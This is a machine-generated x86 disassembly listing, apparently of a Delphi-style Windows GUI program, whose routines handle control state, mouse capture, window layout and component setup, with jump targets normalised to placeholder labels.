mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_42f57c
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_42f980
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41dd60
push eax
call sub_42f57c
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f768
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41dd60
push eax
call sub_42f57c
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f6cc
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_42f57c
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_42f8c0
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41dd60
push eax
call sub_42f57c
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f768
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41dd60
push eax
call sub_42f57c
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f6cc
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41d618
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d9bc
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_412bb8
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_43a570
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_43c850
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42d388
mov edx 0xff000014
mov eax 0xff00000f
call sub_4240cc
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41d5ec
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d9bc
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42da01
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f0c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_412bb8
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41ce24
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_43a570
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_43c850
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42d388
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_42da08
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_438e1c
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_43b724
jmp r-xdata
sub_42da6c
push ebx
mov ebx eax
mov eax ebx
call sub_43c62c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_42c840
pop ebx
retn
sub_42da98
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43bb38
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42daf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43bdf0
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_42da08
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_439f74
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_439fb8
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_42db90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43be98
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_439f74
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_439fb8
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_42dd48
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_42da08
mov eax ebx
mov si 0xffeb
call sub_403394
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_42dcdc
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_42c818
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dd10
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_43daa8
sub_42dd48
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_42dd10
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_42de40
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42deb0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_42c840
mov eax ebx
call sub_42da08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_42dee4
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_446d48
sub_42df54
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42dfdd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43a570
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4516a0
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403394
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dfe4
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_42e020
push ebx
push esi
mov esi eax
mov eax esi
call sub_43c29c
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42e094
push ebx
push esi
mov esi eax
mov eax esi
call sub_43c2b4
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42e0fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42dcac
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_4224a8
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41d618
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412be0
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4224a8
pop edx
call sub_41d9bc
push 0x0
push edi
push 0x1
mov eax ebx
call sub_4224a8
mov edx eax
xor ecx ecx
mov eax esi
call sub_4480cc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e18c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43c444
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_42ddd4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42dcac
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_447bb4
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_42e0fc
pop ecx
sub_42e248
or al [ eax ]
add [ eax ] al
lodsb [ esi ]
mov ecx 0xc1700047
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c0047b9 ] ch
rol [ edi ] 0x0
add [ eax ] al
add [ ecx + edi * 4 - 0x402bffb9 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x3bffb847 ] ah
rol [ edi ] 0x0
add [ eax ] al
add [ ecx + edi * 4 - 0x3e53ffb9 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0xbffb847 ] bl
retn
sub_42e2ad
mov ecx 0xc3dc0047
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffb847 ] cl
mov edi 0x47
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e2f0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e2f7
retn
call sub_42e22c
sub_42e5a9
clc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42e61b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42e5e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4429f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e622
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_42e5e8
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a5a0
call sub_4039a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e622
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_42e62c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_42e8e1
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_427a94
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_423c8c
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_403f3c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a830
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a5a0
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_42ac80
mov edx 0x6
mov eax ebx
call sub_42acb8
mov dx 0x1
mov eax ebx
call sub_440f74
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_432f34
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a5a0
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_439a84
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d4d8
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_42dcac
mov ecx r-xdata
mov edx [ rw-data ]
call sub_4228c8
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_405af8
xor edx edx
mov eax ebx
call sub_43a6e4
mov dl 0x1
mov eax ebx
call sub_43a6c0
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a830
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a5a0
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_439a84
mov dl 0x2
mov eax ebx
call sub_42ac64
mov dl 0x1
mov eax ebx
call sub_42ac80
xor edx edx
mov eax ebx
call sub_440f74
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a088
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_439a84
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_42a4b4
mov dl 0x1
mov eax ebx
call sub_42a484
mov dl 0x1
mov eax ebx
call sub_42a45c
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e8e8
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
add esp 0xfffffff0
call sub_4034bc
sub_42e8e8
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42eae9
xor ebx ebx
call sub_4039a0
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_427c94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eb87
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f0c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f0c
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_43a5a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_42a474
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_43a5a0
sub_42eba4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ec7c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_439f30
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_439f10
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_439ce0
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_42a474
lea eax [ ebx + 0xcc ]
call sub_403ee8
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_43a5a0
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_43e48c
mov eax ebx
call sub_4279fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec83
lea eax [ ebp - 0x34 ]
call sub_403ee8
retn
sub_42ecbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_42ef23
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_452b6c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ef06
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4539b0
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a5a0
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_454330
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_454990
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a830
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a5a0
mov dl 0x5
mov eax ebx
call sub_439a84
xor edx edx
mov eax ebx
call sub_42ac80
mov dl 0x1
mov eax ebx
call sub_42acd4
mov edx 0x5
mov eax ebx
call sub_42acb8
mov edx 0xff000005
mov eax ebx
call sub_43a710
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a088
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_439a84
mov dl 0x1
mov eax esi
call sub_42a484
mov dl 0x1
mov eax esi
call sub_42a4b4
mov dl 0x1
mov eax esi
call sub_42a45c
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4203ac
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef0d
mov eax [ ebp - 0x4 ]
call sub_403198
retn
mov eax [ ebp - 0x4 ]
call sub_439f74
mov esi eax
mov eax ebx
call sub_439f74
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4203ac
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_454500
call sub_457c7c
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_4242d4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_453950
mov eax [ ebp - 0x4 ]
call sub_439fb8
mov esi eax
mov eax ebx
call sub_439fb8
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4203c4
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_454500
call sub_457c48
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_4242d4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_453980
add eax 0x3
sub_42ef78
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42efc3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
